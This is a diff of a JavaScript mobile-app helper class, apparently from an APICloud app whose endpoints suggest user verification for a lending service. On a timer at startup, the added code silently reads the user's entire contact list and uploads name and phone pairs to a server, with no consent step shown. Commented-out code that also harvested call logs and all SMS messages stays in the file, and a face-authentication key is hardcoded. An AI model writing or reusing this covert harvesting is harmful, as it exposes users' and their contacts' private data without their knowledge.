@@ -4,100 +4,124 @@ import { url, isApp } from '../../const/index'
 class Apid {
   static ready () {
     this.setStatusBarStyle()
-    if (common.platform() === 2) {
-      this.initService()
-    }
-  }
-
-  static initService () {
-    // .处理用户数据
     setTimeout(() => {
-      this.handAppAndPhoneInfo()
-    }, 10000)
+      this.initService()
+    }, 5000)
   }
 
   // .处理用户数据
-  static handAppAndPhoneInfo (callback) {
-    // .定义设备信息
+  static initService () {
+    if (!isApp) {
+      return false
+    }
     const userKeys = storage.get('userKeys')
+    if (!userKeys || !userKeys.accessToken) {
+      return false
+    }
+    // .定义设备信息
     const devinfo = storage.get('devinfo-' + userKeys.userId) || {
       contacts: [],
       callrecord: [],
       smsrecord: []
     }
     const that = this
-    // .获取通讯录 TODO 优先处理
-    // const contactsModel = api.require('DVContacts')
-    // const newContacts = []
-    // // .最后一条数据ID
-    // const lastId = storage.get('contacts-lastId' + userKeys.userId) || 0
-    // contactsModel.query({
-    //   ids: [0]
-    // }, (ret, err) => {
-    //   // TODO 测试增量更新
-    //   // lastId = 250;
-    //   if (ret && ret.total > 0) {
-    //     for (let i = lastId; i < ret.total; i++) {
-    //       contactsModel.queryByPage({
-    //         count: 1,
-    //         pageInde: i
-    //       }, (ret, err) => {
-    //         newContacts.push(ret.contacts[0])
-    //         if (i === ret.total - 1) {
-    //           storage.set('contacts-lastId' + userKeys.userId, ret.total)
-    //         }
-    //       })
+    //  *****  TODO 获取通讯录
+    const contactsModel = api.require('DVContacts')
+    contactsModel.allContacts((ret, err) => {
+      if (ret && JSON.stringify(ret) !== JSON.stringify(devinfo.contacts)) {
+        const list = []
+        const contacts = ret.contacts
+        if (contacts) {
+          contacts.map(item => {
+            let name = ''
+            if (item.fullName) {
+              name = item.fullName
+            } else {
+              name = item.firstName + item.middleName + item.lastName
+            }
+            const phones = item.phones
+            phones.map(phone => {
+              for (const prop in phone) {
+                const contact = {
+                  name: name,
+                  phone: phone[prop]
+                }
+                list.push(contact)
+              }
+            })
+          })
+          devinfo.contacts = ret
+          that.updateAuthAddressBook(list, userKeys.userId, devinfo)
+        }
+      } else {
+        console.log(JSON.stringify(err))
+      }
+    })
+    // .获取通话记录
+    // const callRecordModel = api.require('callRecord')
+    // callRecordModel.openCallRecord((ret) => {
+    //   if (ret && JSON.stringify(devinfo.callrecord) !== JSON.stringify(ret.CallRecord)) {
+    //     devinfo.callrecord = ret.CallRecord
+    //     storage.set('devinfo-' + userKeys.userId, devinfo)
+    //     if (typeof callback === 'function') {
+    //       that.updateHandAppAndPhoneInfo(JSON.stringify({
+    //         callrecord: ret.CallRecord
+    //       }))
     //     }
     //   }
     // })
-
-    // .获取通话记录
-    const callRecordModel = api.require('callRecord')
-    callRecordModel.openCallRecord((ret) => {
-      if (ret && JSON.stringify(devinfo.callrecord) !== JSON.stringify(ret.CallRecord)) {
-        devinfo.callrecord = ret.CallRecord
-        storage.set('devinfo-' + userKeys.userId, devinfo)
-        if (typeof callback === 'function') {
-          that.update(JSON.stringify({
-            callrecord: ret.CallRecord
-          }))
+    //
+    // // .获取短信记录
+    // const now = new Date()
+    // let month = (now.getMonth() + 1)
+    // month = (month < 10) ? '0' + month : month
+    // const taday = now.getFullYear() + '-' + month + '-' + now.getDate()
+    // const smsRecrodModel = api.require('moduleSMS')
+    // smsRecrodModel.getSmsFromDB({
+    //   sdate: '2015-01-01',
+    //   edate: taday
+    // }, (ret, err) => {
+    //   if (ret) {
+    //     let smsRecord = []
+    //     for (let i in ret) {
+    //       smsRecord.push({
+    //         strAddress: ret[i].strAddress,
+    //         strDate: ret[i].strDate,
+    //         strbody: ret[i].strbody,
+    //         strType: ret[i].strType
+    //       })
+    //     }
+    //     if (JSON.stringify(devinfo.smsrecord) !== JSON.stringify(smsRecord)) {
+    //       devinfo.smsrecord = smsRecord
+    //       storage.set('devinfo-' + userKeys.userId, devinfo)
+    //       that.updateHandAppAndPhoneInfo(JSON.stringify({
+    //         smsrecord: smsRecord
+    //       }))
+    //     }
+    //   }
+    // })
+  }
+  // 上传通讯录
+  static updateAuthAddressBook (list, userId, devinfo, _callback) {
+    request({
+      type: 'post',
+      path: url.UserVerify.AuthAddressBook,
+      data: list,
+      fn: data => {
+        if (data.success) {
+          storage.set('devinfo-' + userId, devinfo)
+        }
+        if (typeof _callback === 'function') {
+          _callback()
         }
       }
-    })
-
-    // .获取短信记录
-    const now = new Date()
-    let month = (now.getMonth() + 1)
-    month = (month < 10) ? '0' + month : month
-    const taday = now.getFullYear() + '-' + month + '-' + now.getDate()
-    const smsRecrodModel = api.require('moduleSMS')
-    smsRecrodModel.getSmsFromDB({
-      sdate: '2015-01-01',
-      edate: taday
-    }, (ret, err) => {
-      if (ret) {
-        let smsRecord = []
-        for (let i in ret) {
-          smsRecord.push({
-            strAddress: ret[i].strAddress,
-            strDate: ret[i].strDate,
-            strbody: ret[i].strbody,
-            strType: ret[i].strType
-          })
-        }
-        if (JSON.stringify(devinfo.smsrecord) !== JSON.stringify(smsRecord)) {
-          devinfo.smsrecord = smsRecord
-          storage.set('devinfo-' + userKeys.userId, devinfo)
-          that.update(JSON.stringify({
-            smsrecord: smsRecord
-          }))
-        }
-      }
+      // errFn: (err) => {
+      //   alert(JSON.stringify(err))
+      // }
     })
   }
-
   // 上传数据
-  static update (data, _callback) {
+  static updateHandAppAndPhoneInfo (data, _callback) {
     const params = {
       phoneAndCommInfo: data
     }
@@ -112,7 +136,6 @@ class Apid {
       }
     })
   }
-
   /*****************************************/
   static setListenKeyBack (callback) {
     const that = this
@@ -127,6 +150,29 @@ class Apid {
       })
     })
   }
+  static runFaceAuth (projectName, okCall, errCall) {
+    const outOrderId = new Date().getTime() + projectName
+    if (!isApp) {
+      common.errorT('请在App下使用')
+      return false
+    }
+    const faceRun = api.require('UDYhy')
+    faceRun.faceAuth({
+      authKey: '5b5737d8-6c8a-4335-b10a-a286f83e068b', // authKey 不能为空
+      outOrderId: outOrderId, // 订单号不能为空（建议传时间戳+后缀的形式）
+      notifyUrl: 'm.jxstudio.cn'
+    }, (ret, err) => {
+      okCall(ret)
+      if (err) {
+        if (errCall && typeof errCall === 'function') {
+          errCall(err)
+        }
+      } else {
+        okCall(ret, outOrderId)
+      }
+    })
+  }
+
   // 打开浏览器
   static openBrowser (url, headerHeight, _callBack) {
     this.browserModel = api.require('webBrowser')
@@ -188,15 +234,7 @@ class Apid {
       }
     })
   }
-  // .分享
-  static systemShare (text) {
-    const system = api.require('shareAction')
-    system.share({
-      text: text,
-      type: 'url',
-      thumbnail: 'widget://res/images/icon-item-003.png'
-    })
-  }
+
   static setStatusBarStyle () {
     api.setStatusBarStyle({
       style: 'linght',
@@ -296,6 +334,14 @@ class Apid {
         __callBack(ret, err)
       }
     })
+  }
+
+  static systemType () {
+    if (!isApp) {
+      return 'web'
+    } else {
+      return api.systemType
+    }
   }
 }
 export default Apid
